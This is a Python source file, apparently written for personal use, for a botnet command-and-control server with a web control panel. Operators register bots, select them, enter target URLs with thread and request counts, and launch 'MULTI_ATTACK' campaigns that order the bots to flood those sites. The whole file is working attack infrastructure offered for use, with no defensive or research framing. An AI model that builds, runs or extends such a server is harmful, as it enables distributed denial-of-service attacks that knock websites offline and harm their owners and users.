#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔════════════════════════════════════════════════════════════════════╗
║         Python C&C Server v8.1 - FIXED FINAL EDITION              ║
║  Multi-Target • Real-time • Bot Management • FIXED BOT SELECT      ║
╚════════════════════════════════════════════════════════════════════╝

Author: huynhthienphat
Date: 2025-11-23 14:18:54 UTC
Platform: Multi-OS
Version: 8.1 Fixed
"""

import os
import sys
import subprocess
import threading
import time
import json
import socket
import platform
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, redirect
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import uuid
from pathlib import Path

# ============= INITIALIZATION =============
app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

PORT = 5000
LOG_DIR = Path('./logs')
LOG_DIR.mkdir(exist_ok=True)

# Global state
connected_clients = {}
command_history = []
active_commands = {}
active_attacks = {}
multi_target_campaigns = {}

# Current info
CURRENT_USER = "huynhthienphat"
CURRENT_TIME = "2025-11-23 14:18:54"

# ============= SERVER CLASS =============
class PythonCCServer:
    def __init__(self):
        self.device_id = self.generate_device_id()
        self.device_name = self.get_device_name()
        self.username = CURRENT_USER
        self.platform_info = platform.system()
        self.start_time = datetime.utcnow()

    def generate_device_id(self):
        try:
            hostname = socket.gethostname()
            mac = uuid.getnode()
            return f"{hostname}-{mac}".lower()
        except:
            return f"python-cc-{int(time.time())}"

    def get_device_name(self):
        try:
            return socket.gethostname()
        except:
            return "Python-CC-Server"

    def print_banner(self):
        banner = f"""
╔════════════════════════════════════════════════════════════════════╗
║         Python C&C Server v8.1 - FIXED FINAL EDITION              ║
║  Multi-Target • Real-time • Campaigns • BOT SELECT FIXED           ║
╚════════════════════════════════════════════════════════════════════╝

📍 Server Name: {self.device_name}
🆔 Device ID: {self.device_id}
👤 User: {self.username}
🖥️  Platform: {self.platform_info}

🌐 Web URLs:
   • Web Controller: http://localhost:{PORT}/controller
   • WebSocket: ws://localhost:{PORT}/socket.io
   • API Base: http://localhost:{PORT}/api

📊 Current Time: {CURRENT_TIME} UTC
🚀 Server Status: READY

Connected Clients: {len(connected_clients)}
Active Campaigns: {len(multi_target_campaigns)}
"""
        print(banner)

cc_server = PythonCCServer()

# ============= BOT REGISTRATION ROUTES =============

@app.route('/api/bot/register', methods=['POST'])
def bot_register():
    """Bot đăng ký kết nối"""
    data = request.json
    bot_id = data.get('botId') or str(uuid.uuid4())
    
    bot = {
        'id': bot_id,
        'name': data.get('botName', 'Unknown-Bot'),
        'status': 'idle',
        'registered_at': datetime.utcnow().isoformat(),
        'last_heartbeat': time.time(),
        'attack_count': 0,
        'requests_sent': 0,
        'requests_failed': 0,
        'current_campaign': None,
        'peak_rps': 0,
        'max_concurrent': 0
    }

    connected_clients[bot_id] = bot
    log_message(f"🤖 Bot registered: {bot['name']} ({bot_id})")
    
    # Broadcast update tới tất cả web clients
    socketio.emit('bots_updated', {
        'bots': [c for c in connected_clients.values() if 'attack_count' in c],
        'total': len([c for c in connected_clients.values() if 'attack_count' in c])
    }, broadcast=True)

    return jsonify({
        'success': True,
        'botId': bot_id,
        'message': f'Bot registered: {bot["name"]}'
    })

@app.route('/api/bot/unregister', methods=['POST'])
def bot_unregister():
    """Bot hủy đăng ký"""
    data = request.json
    bot_id = data.get('botId')
    
    if bot_id in connected_clients:
        bot = connected_clients.pop(bot_id)
        log_message(f"✗ Bot unregistered: {bot['name']}")
        socketio.emit('bots_updated', {
            'bots': [c for c in connected_clients.values() if 'attack_count' in c],
            'total': len([c for c in connected_clients.values() if 'attack_count' in c])
        }, broadcast=True)
    
    return jsonify({'success': True})

@app.route('/api/bot/heartbeat', methods=['POST'])
def bot_heartbeat():
    """Bot gửi heartbeat"""
    data = request.json
    bot_id = data.get('botId')
    
    if bot_id in connected_clients:
        bot = connected_clients[bot_id]
        bot['last_heartbeat'] = time.time()
        bot['requests_sent'] = data.get('requests_sent', 0)
        bot['requests_failed'] = data.get('requests_failed', 0)
        bot['status'] = data.get('status', 'idle')
        bot['peak_rps'] = data.get('peak_rps', 0)
        bot['max_concurrent'] = data.get('max_concurrent', 0)
        
        # Broadcast update
        socketio.emit('bot_updated', bot, broadcast=True)

    return jsonify({'success': True})

# ============= CAMPAIGN ROUTES =============

@app.route('/api/campaign/create', methods=['POST'])
def create_campaign():
    """Tạo campaign tấn công"""
    data = request.json
    campaign_id = str(uuid.uuid4())
    
    targets = data.get('targets', [])
    bots = data.get('bots', [])
    threads_per_target = data.get('threadsPerTarget', 10)
    requests_per_target = data.get('requestsPerTarget', 5000)
    
    # Validate bots
    valid_bots = []
    for bot_id in bots:
        if bot_id in connected_clients:
            valid_bots.append(bot_id)
    
    if not valid_bots:
        return jsonify({'success': False, 'error': 'No valid bots selected'}), 400
    
    campaign = {
        'id': campaign_id,
        'name': data.get('campaignName', f'Campaign-{campaign_id[:8]}'),
        'targets': targets,
        'bots': valid_bots,
        'threadsPerTarget': threads_per_target,
        'requestsPerTarget': requests_per_target,
        'created_at': datetime.utcnow().isoformat(),
        'status': 'created',
        'attack_progress': {}
    }
    
    for target in targets:
        campaign['attack_progress'][target] = {
            'success': 0,
            'failed': 0,
            'running': False,
            'bots_assigned': []
        }
    
    multi_target_campaigns[campaign_id] = campaign
    log_message(f"📋 Campaign created: {campaign['name']} ({len(targets)} targets, {len(valid_bots)} bots)")
    
    socketio.emit('campaign_created', campaign, broadcast=True)
    
    return jsonify({
        'success': True,
        'campaignId': campaign_id,
        'campaign': campaign
    })

@app.route('/api/campaign/<campaign_id>/launch', methods=['POST'])
def launch_campaign(campaign_id):
    """Bắt đầu campaign"""
    if campaign_id not in multi_target_campaigns:
        return jsonify({'success': False, 'error': 'Campaign not found'}), 404
    
    campaign = multi_target_campaigns[campaign_id]
    campaign['status'] = 'running'
    campaign['started_at'] = datetime.utcnow().isoformat()
    
    log_message(f"🔥 Campaign launched: {campaign['name']}")
    
    targets = campaign['targets']
    bots = campaign['bots']
    
    for idx, bot_id in enumerate(bots):
        assigned_targets = []
        for i, target in enumerate(targets):
            if i % len(bots) == idx:
                assigned_targets.append(target)
        
        if assigned_targets:
            attack_cmd = {
                'id': str(uuid.uuid4()),
                'action': 'MULTI_ATTACK',
                'campaignId': campaign_id,
                'targets': assigned_targets,
                'threadsPerTarget': campaign['threadsPerTarget'],
                'requestsPerTarget': campaign['requestsPerTarget'],
                'timestamp': datetime.utcnow().isoformat()
            }
            
            socketio.emit('multi_attack_command', attack_cmd, room=bot_id)
            
            for target in assigned_targets:
                campaign['attack_progress'][target]['bots_assigned'].append(bot_id)
    
    socketio.emit('campaign_updated', campaign, broadcast=True)
    
    return jsonify({
        'success': True,
        'message': f'Campaign launched with {len(bots)} bots'
    })

@app.route('/api/campaign/<campaign_id>/stop', methods=['POST'])
def stop_campaign(campaign_id):
    """Dừng campaign"""
    if campaign_id not in multi_target_campaigns:
        return jsonify({'success': False, 'error': 'Campaign not found'}), 404
    
    campaign = multi_target_campaigns[campaign_id]
    campaign['status'] = 'stopped'
    campaign['stopped_at'] = datetime.utcnow().isoformat()
    
    log_message(f"🛑 Campaign stopped: {campaign['name']}")
    
    for bot_id in campaign['bots']:
        socketio.emit('multi_attack_stop', {'campaignId': campaign_id}, room=bot_id)
    
    socketio.emit('campaign_updated', campaign, broadcast=True)
    
    return jsonify({'success': True, 'message': 'Campaign stopped'})

# ============= INFO ROUTES =============

@app.route('/api/bots', methods=['GET'])
def get_bots():
    """Lấy danh sách bots"""
    bots_list = [c for c in connected_clients.values() if 'attack_count' in c]
    
    return jsonify({
        'success': True,
        'totalBots': len(bots_list),
        'bots': bots_list
    })

@app.route('/api/campaigns', methods=['GET'])
def get_campaigns():
    """Lấy danh sách campaigns"""
    return jsonify({
        'success': True,
        'totalCampaigns': len(multi_target_campaigns),
        'campaigns': list(multi_target_campaigns.values())
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Lấy trạng thái server"""
    uptime = datetime.utcnow() - cc_server.start_time
    
    return jsonify({
        'success': True,
        'serverName': cc_server.device_name,
        'connectedBots': len([c for c in connected_clients.values() if 'attack_count' in c]),
        'activeCampaigns': len([c for c in multi_target_campaigns.values() if c['status'] == 'running']),
        'totalClients': len(connected_clients),
        'uptime': str(uptime),
        'serverTime': datetime.utcnow().isoformat(),
        'currentUser': CURRENT_USER,
        'currentTime': CURRENT_TIME
    })

# ============= WEBSOCKET EVENTS =============

@socketio.on('connect')
def handle_connect():
    print(f"✓ Web client connected: {request.sid}")
    emit('connection_response', {'data': 'Connected to C&C Server'})
    
    bots_list = [c for c in connected_clients.values() if 'attack_count' in c]
    
    emit('bots_updated', {
        'bots': bots_list,
        'total': len(bots_list)
    })
    emit('campaigns_updated', {
        'campaigns': list(multi_target_campaigns.values()),
        'total': len(multi_target_campaigns)
    })

@socketio.on('disconnect')
def handle_disconnect():
    print(f"✗ Web client disconnected: {request.sid}")

@socketio.on('request_bots')
def handle_request_bots():
    """Web request danh sách bots"""
    bots_list = [c for c in connected_clients.values() if 'attack_count' in c]
    emit('bots_updated', {
        'bots': bots_list,
        'total': len(bots_list)
    })

# ============= WEB ROUTES =============

@app.route('/')
def index():
    return redirect('/controller')

@app.route('/controller')
def controller():
    return render_template_string(WEB_CONTROLLER_HTML)

# ============= UTILITIES =============

def log_message(message):
    """Log message"""
    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    print(f"[{timestamp}] {message}")
    
    log_file = LOG_DIR / "cc_server.log"
    with open(log_file, 'a') as f:
        f.write(f"[{timestamp}] {message}\n")

# ============= WEB CONTROLLER HTML - FIXED BOT SELECT =============

WEB_CONTROLLER_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Python C&C - Control Panel v8.1</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0f172a;
            color: #10b981;
            min-height: 100vh;
            padding: 20px;
        }

        .container { max-width: 1600px; margin: 0 auto; }

        .header {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .header h1 {
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 10px;
        }

        .header-info {
            font-size: 12px;
            opacity: 0.9;
            display: flex;
            gap: 20px;
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }

        .panel {
            background: #1e293b;
            border: 2px solid #3b82f6;
            border-radius: 8px;
            padding: 20px;
        }

        .panel h2 {
            color: #60a5fa;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 18px;
        }

        .bots-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
            max-height: 400px;
            overflow-y: auto;
        }

        .bot-item {
            background: #0f172a;
            border: 2px solid #3b82f6;
            padding: 12px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .bot-item:hover {
            background: #3b82f6;
            transform: translateX(5px);
        }

        .bot-item.selected {
            background: #10b981;
            border-color: #10b981;
            color: white;
        }

        .bot-item input[type="checkbox"] {
            width: 20px;
            height: 20px;
            cursor: pointer;
            accent-color: #10b981;
        }

        .bot-info {
            flex: 1;
            font-size: 12px;
        }

        .bot-status {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #10b981;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        input[type="text"], textarea, input[type="number"] {
            background: #0f172a;
            border: 2px solid #3b82f6;
            color: #10b981;
            padding: 10px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            width: 100%;
            margin-bottom: 10px;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #60a5fa;
            box-shadow: 0 0 8px rgba(96, 165, 250, 0.3);
        }

        button {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            border: none;
            padding: 12px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            width: 100%;
            font-family: 'Courier New', monospace;
        }

        button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 16px rgba(239, 68, 68, 0.4);
        }

        button:disabled {
            background: #64748b;
            cursor: not-allowed;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-card {
            background: #1e293b;
            border: 2px solid #3b82f6;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #60a5fa;
        }

        .stat-label {
            font-size: 12px;
            color: #cbd5e1;
            margin-top: 5px;
        }

        .campaign-item {
            background: #0f172a;
            border: 2px solid #ef4444;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 10px;
        }

        .scrollbar::-webkit-scrollbar { width: 6px; }
        .scrollbar::-webkit-scrollbar-track { background: #0f172a; }
        .scrollbar::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 3px; }

        textarea { resize: vertical; }

        .selected-bots-display {
            background: #0f172a;
            border: 1px solid #10b981;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 12px;
            color: #10b981;
        }

        .section-title {
            color: #cbd5e1;
            font-size: 12px;
            margin-bottom: 8px;
            display: block;
        }

        .error-message {
            background: #7f1d1d;
            color: #fca5a5;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 12px;
            border-left: 3px solid #dc2626;
        }

        .success-message {
            background: #064e3b;
            color: #86efac;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 12px;
            border-left: 3px solid #10b981;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <i class="fas fa-robot"></i>
                Python C&C Control Panel v8.1 - FIXED
            </h1>
            <div class="header-info">
                <span>🤖 Bots: <strong id="bot-count">0</strong></span>
                <span>📋 Campaigns: <strong id="campaign-count">0</strong></span>
                <span>⏰ Time: <span id="server-time">--:--:--</span></span>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="total-bots">0</div>
                <div class="stat-label">Connected Bots</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="active-campaigns">0</div>
                <div class="stat-label">Running Campaigns</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="total-targets">0</div>
                <div class="stat-label">Total Targets</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="total-requests">0</div>
                <div class="stat-label">Requests Sent</div>
            </div>
        </div>

        <div class="grid">
            <div class="panel">
                <h2><i class="fas fa-robot"></i> Select Bots (FIXED)</h2>
                <div id="message-container"></div>
                <div class="selected-bots-display">
                    <strong>Selected:</strong> <span id="selected-count">0</span> bots
                    <br><span id="selected-list" style="font-size: 10px; color: #cbd5e1;"></span>
                </div>
                <button onclick="refreshBots()" style="margin-bottom: 10px;">
                    <i class="fas fa-sync"></i> Refresh Bots
                </button>
                <div class="bots-list scrollbar" id="bots-container">
                    <div style="color: #cbd5e1; text-align: center; padding: 20px;">⏳ No bots connected</div>
                </div>
            </div>

            <div class="panel">
                <h2><i class="fas fa-cogs"></i> Campaign Settings</h2>
                <div>
                    <label class="section-title">Campaign Name:</label>
                    <input type="text" id="campaign-name" placeholder="Campaign Name (optional)">
                    
                    <label class="section-title">Targets (one per line):</label>
                    <textarea id="targets-input" placeholder="http://example.com&#10;https://target.org&#10;http://site.net" rows="4"></textarea>
                    
                    <label class="section-title">Threads per Target:</label>
                    <input type="number" id="threads-per-target" placeholder="Threads" value="10" min="1">
                    
                    <label class="section-title">Requests per Target:</label>
                    <input type="number" id="requests-per-target" placeholder="Requests" value="5000" min="1">
                    
                    <button onclick="createCampaign()">
                        <i class="fas fa-rocket"></i> Create & Launch Campaign
                    </button>
                </div>
            </div>
        </div>

        <div class="panel">
            <h2><i class="fas fa-tasks"></i> Active Campaigns</h2>
            <div class="scrollbar" id="campaigns-container" style="max-height: 400px; overflow-y: auto;">
                <div style="color: #cbd5e1;">No campaigns running</div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedBots = [];
        let allBots = [];

        socket.on('connect', () => {
            console.log('✓ Connected to C&C Server');
            showMessage('✓ Connected to server', 'success');
        });

        socket.on('bots_updated', (data) => {
            updateBotsList(data.bots || []);
            document.getElementById('total-bots').textContent = data.total || 0;
            document.getElementById('bot-count').textContent = data.total || 0;
        });

        socket.on('campaign_created', () => {
            loadCampaigns();
            showMessage('✓ Campaign created!', 'success');
        });

        socket.on('campaign_updated', () => {
            loadCampaigns();
        });

        socket.on('disconnect', () => {
            showMessage('✗ Disconnected from server', 'error');
        });

        function refreshBots() {
            console.log('Refreshing bots...');
            socket.emit('request_bots');
        }

        function updateBotsList(bots) {
            allBots = bots;
            const container = document.getElementById('bots-container');
            
            if (!bots || bots.length === 0) {
                container.innerHTML = '<div style="color: #cbd5e1; text-align: center; padding: 20px;">⏳ No bots connected - waiting...</div>';
                return;
            }

            container.innerHTML = bots.map(bot => `
                <div class="bot-item ${selectedBots.includes(bot.id) ? 'selected' : ''}" onclick="toggleBot(event, '${bot.id}')">
                    <input type="checkbox" ${selectedBots.includes(bot.id) ? 'checked' : ''} onchange="toggleBot(event, '${bot.id}')">
                    <div class="bot-status"></div>
                    <div class="bot-info">
                        <strong>${bot.name}</strong>
                        <br>🆔 ${bot.id.substring(0, 12)}...
                        <br>📊 Sent: ${bot.requests_sent || 0} | ❌ Failed: ${bot.requests_failed || 0}
                    </div>
                </div>
            `).join('');
        }

        function toggleBot(event, botId) {
            event.stopPropagation();
            
            const idx = selectedBots.indexOf(botId);
            if (idx > -1) {
                selectedBots.splice(idx, 1);
            } else {
                selectedBots.push(botId);
            }
            
            updateSelectedDisplay();
        }

        function updateSelectedDisplay() {
            document.getElementById('selected-count').textContent = selectedBots.length;
            
            const selectedNames = selectedBots.map(id => {
                const bot = allBots.find(b => b.id === id);
                return bot ? bot.name : id.substring(0, 8);
            }).join(', ');
            
            document.getElementById('selected-list').textContent = 
                selectedBots.length > 0 ? selectedNames : 'None selected';
        }

        async function createCampaign() {
            const name = document.getElementById('campaign-name').value.trim();
            const targetsText = document.getElementById('targets-input').value.trim();
            const threads = parseInt(document.getElementById('threads-per-target').value) || 10;
            const requests = parseInt(document.getElementById('requests-per-target').value) || 5000;

            const targets = targetsText.split('\\n')
                .map(t => t.trim())
                .filter(t => t && (t.startsWith('http://') || t.startsWith('https://')));

            if (selectedBots.length === 0) {
                showMessage('❌ No bots selected!', 'error');
                return;
            }

            if (targets.length === 0) {
                showMessage('❌ No valid targets! (must start with http:// or https://)', 'error');
                return;
            }

            try {
                showMessage('⏳ Creating campaign...', 'info');
                
                const res = await fetch('/api/campaign/create', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        campaignName: name || `Campaign-${Date.now()}`,
                        targets,
                        bots: selectedBots,
                        threadsPerTarget: threads,
                        requestsPerTarget: requests
                    })
                });

                const data = await res.json();
                
                if (!data.success) {
                    showMessage(`❌ Error: ${data.error}`, 'error');
                    return;
                }

                // Launch campaign
                const launchRes = await fetch(`/api/campaign/${data.campaignId}/launch`, {
                    method: 'POST'
                });
                
                if (launchRes.ok) {
                    showMessage(`✓ Campaign launched! Targets: ${targets.length} | Bots: ${selectedBots.length}`, 'success');
                    
                    // Clear form
                    document.getElementById('targets-input').value = '';
                    document.getElementById('campaign-name').value = '';
                    selectedBots = [];
                    updateSelectedDisplay();
                    
                    loadCampaigns();
                } else {
                    showMessage('❌ Failed to launch campaign', 'error');
                }
            } catch (e) {
                console.error('Error:', e);
                showMessage(`❌ Error: ${e.message}`, 'error');
            }
        }

        async function loadCampaigns() {
            try {
                const res = await fetch('/api/campaigns');
                const data = await res.json();
                const container = document.getElementById('campaigns-container');
                
                if (!data.campaigns || data.campaigns.length === 0) {
                    container.innerHTML = '<div style="color: #cbd5e1;">No campaigns</div>';
                    return;
                }

                container.innerHTML = data.campaigns.map(c => `
                    <div class="campaign-item">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <strong>${c.name}</strong>
                            <span style="font-size: 10px; padding: 4px 8px; background: ${c.status === 'running' ? '#ef4444' : '#64748b'}; color: white; border-radius: 3px;">
                                ${c.status.toUpperCase()}
                            </span>
                        </div>
                        <div style="font-size: 11px; color: #cbd5e1;">
                            🎯 Targets: ${c.targets.length} | 🤖 Bots: ${c.bots.length}
                            <br>⚙️ Threads: ${c.threadsPerTarget} | 📊 Requests: ${c.requestsPerTarget}
                        </div>
                        ${c.status === 'running' ? `
                            <button onclick="stopCampaign('${c.id}')" style="margin-top: 10px; background: #64748b;">
                                🛑 Stop Campaign
                            </button>
                        ` : ''}
                    </div>
                `).join('');
                
                document.getElementById('campaign-count').textContent = data.totalCampaigns || 0;
                document.getElementById('active-campaigns').textContent = 
                    (data.campaigns || []).filter(c => c.status === 'running').length;
            } catch (e) {
                console.error('Error loading campaigns:', e);
            }
        }

        async function stopCampaign(campaignId) {
            try {
                await fetch(`/api/campaign/${campaignId}/stop`, { method: 'POST' });
                loadCampaigns();
            } catch (e) {
                console.error('Error:', e);
            }
        }

        function showMessage(message, type) {
            const container = document.getElementById('message-container');
            const className = type === 'error' ? 'error-message' : type === 'success' ? 'success-message' : 'error-message';
            
            container.innerHTML = `<div class="${className}">${message}</div>`;
            
            setTimeout(() => {
                container.innerHTML = '';
            }, 5000);
        }

        // Update time
        setInterval(() => {
            const now = new Date();
            document.getElementById('server-time').textContent = now.toLocaleTimeString();
        }, 1000);

        // Auto-refresh
        setInterval(loadCampaigns, 2000);
        setInterval(refreshBots, 5000);  // Refresh bots mỗi 5s
    </script>
</body>
</html>
'''

# ============= MAIN =============

if __name__ == '__main__':
    cc_server.print_banner()
    
    try:
        print(f"\n🚀 Starting C&C server on http://localhost:{PORT}")
        print(f"📊 Web Dashboard: http://localhost:{PORT}/controller")
        print(f"📡 Ready for bot connections on localhost\n")
        socketio.run(app, host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print("\n\n👋 Server shutdown...")
    except Exception as e:
        print(f"\n❌ Error: {e}")